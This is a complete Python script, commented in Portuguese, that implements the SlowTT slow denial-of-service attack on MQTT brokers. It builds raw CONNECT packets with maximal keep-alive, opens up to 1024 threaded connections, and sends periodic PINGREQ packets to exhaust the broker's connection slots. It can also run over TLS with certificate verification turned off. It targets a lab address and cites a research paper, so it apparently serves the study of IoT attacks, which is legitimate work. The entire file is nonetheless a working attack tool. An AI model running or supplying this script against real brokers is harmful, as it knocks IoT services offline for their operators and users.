#!/usr/bin/env python3
"""
Ataque SlowTT (Slow Denial of Service against MQTT)
Baseado em: Vaccari et al. (2020) - "SlowTT: A Slow Denial of Service Against IoT Networks"

Descrição:
  Este script estabelece múltiplas conexões simultâneas com um Broker MQTT.
  Para cada conexão:
    1. Envia um pacote CONNECT definindo um Keep-Alive alto (ex: 65535s).
    2. Mantém a conexão viva enviando pacotes PINGREQ periodicamente (Wait Timeout - WT)
       antes que o servidor feche a sessão por inatividade.
  Isso resulta na exaustão de soquetes/conexões do Broker com baixíssimo consumo de banda.
"""

import socket
import ssl
import time
import threading
import sys
import argparse

# Configurações Padrão
BROKER_HOST = "10.0.2.10"
BROKER_PORT = 1883
NUM_CONNECTIONS = 1024  # Limite padrão de conexões do Mosquitto
KEEP_ALIVE = 65535      # Valor máximo de Keep-Alive permitido no MQTT (16 bits)
WAIT_TIMEOUT = 60       # Intervalo em segundos para envio dos pacotes PINGREQ (WT < Keep-Alive)
USE_TLS = False

# Estrutura de controle
active_connections = []
lock = threading.Lock()
running = True

def build_mqtt_connect_packet(client_id, keep_alive):
    """
    Constrói manualmente o pacote binário MQTT CONNECT (MQTT v3.1.1).
    Evita overhead de bibliotecas de alto nível para permitir controle fino.
    """
    protocol_name = b"MQTT"
    protocol_level = 4  # v3.1.1
    connect_flags = 0x02  # Clean Session = 1
    
    # Payload: Client ID em UTF-8
    client_id_bytes = client_id.encode('utf-8')
    payload = len(client_id_bytes).to_bytes(2, byteorder='big') + client_id_bytes
    
    # Cabeçalho Variável
    variable_header = (
        len(protocol_name).to_bytes(2, byteorder='big') +
        protocol_name +
        protocol_level.to_bytes(1, byteorder='big') +
        connect_flags.to_bytes(1, byteorder='big') +
        keep_alive.to_bytes(2, byteorder='big')
    )
    
    variable_and_payload = variable_header + payload
    
    # Cabeçalho Fixo (0x10 = CONNECT)
    remaining_length = len(variable_and_payload)
    fixed_header = b'\x10' + remaining_length.to_bytes(1, byteorder='big')
    
    return fixed_header + variable_and_payload

def build_mqtt_pingreq_packet():
    """
    Constrói o pacote binário MQTT PINGREQ.
    0xC0 = PINGREQ, 0x00 = Comprimento Restante (0 bytes).
    """
    return b'\xc0\x00'

def attack_worker(thread_id, host, port, keep_alive, wt, use_tls):
    """
    Função executada por cada thread para abrir uma conexão e mantê-la viva com PINGREQ.
    """
    global running
    client_id = f"slowtt_bot_{thread_id}_{int(time.time())}"
    
    try:
        # 1. Criação do Socket TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10.0)
        
        # Envelopamento TLS se habilitado
        if use_tls:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
            
        sock.connect((host, port))
        
        # 2. Envio do pacote CONNECT
        connect_packet = build_mqtt_connect_packet(client_id, keep_alive)
        sock.sendall(connect_packet)
        
        # Recebe CONNACK do Broker
        connack = sock.recv(4)
        if len(connack) < 4 or connack[0] != 0x20 or connack[3] != 0x00:
            sock.close()
            return
            
        with lock:
            active_connections.append(sock)
            print(f"[+] [Conexão {len(active_connections)}] Estabelecida com sucesso - ClientID: {client_id}")
            
        sock.settimeout(None)  # Remove timeout para manter a conexão aberta
        
        # 3. Loop do SlowTT: Envio periódico de PINGREQ (Wait Timeout)
        ping_packet = build_mqtt_pingreq_packet()
        while running:
            time.sleep(wt)
            try:
                sock.sendall(ping_packet)
                # Tenta ler o PINGRESP (0xD0 0x00) enviado pelo Broker
                sock.settimeout(5.0)
                resp = sock.recv(2)
                sock.settimeout(None)
            except Exception:
                break

    except Exception as e:
        pass
    finally:
        try:
            sock.close()
        except:
            pass

def main():
    global running
    parser = argparse.ArgumentParser(description="Script de Ataque SlowTT contra MQTT Broker")
    parser.add_argument("--host", default=BROKER_HOST, help="IP do Broker MQTT Alvo")
    parser.add_argument("--port", type=int, default=BROKER_PORT, help="Porta do Broker MQTT (1883 sem TLS / 8883 com TLS)")
    parser.add_argument("-c", "--connections", type=int, default=NUM_CONNECTIONS, help="Número de conexões simultâneas")
    parser.add_argument("-k", "--keepalive", type=int, default=KEEP_ALIVE, help="Valor de Keep-Alive (em segundos)")
    parser.add_argument("-wt", "--waittimeout", type=int, default=WAIT_TIMEOUT, help="Intervalo de envio dos pacotes PINGREQ (em segundos)")
    parser.add_argument("--tls", action="store_true", help="Habilitar criptografia TLS")
    
    args = parser.parse_args()

    print("=" * 60)
    print("           INICIANDO ATAQUE SLOWTT (MQTT SLOW DOS)           ")
    print("=" * 60)
    print(f" Alvo           : {args.host}:{args.port}")
    print(f" Conexões Alvo  : {args.connections}")
    print(f" Keep-Alive     : {args.keepalive}s")
    print(f" Wait Timeout   : {args.waittimeout}s (PINGREQ interval)")
    print(f" TLS Habilitado : {args.tls}")
    print("=" * 60)
    
    threads = []
    
    # Disparo de threads para estabelecer conexões concorrentes
    for i in range(args.connections):
        if not running:
            break
        t = threading.Thread(target=attack_worker, args=(i, args.host, args.port, args.keepalive, args.waittimeout, args.tls))
        t.daemon = True
        threads.append(t)
        t.start()
        time.sleep(0.01)  # Pequeno atraso para evitar saturação instantânea do sistema local

    print(f"\n[*] Todas as {args.connections} threads de ataque foram disparadas.")
    print("[*] Pressione Ctrl+C para encerrar o ataque e liberar o Broker.\n")

    try:
        while True:
            time.sleep(1)
            with lock:
                print(f"\r[STATUS] Conexões ativas presas no Broker: {len(active_connections)}/{args.connections}", end="", flush=True)
    except KeyboardInterrupt:
        print("\n\n[-] Interrupção solicitada. Encerrando conexões...")
        running = False
        with lock:
            for s in active_connections:
                try:
                    s.close()
                except:
                    pass
        print("[+] Conexões encerradas com sucesso.")
        sys.exit(0)

if __name__ == "__main__":
    main()
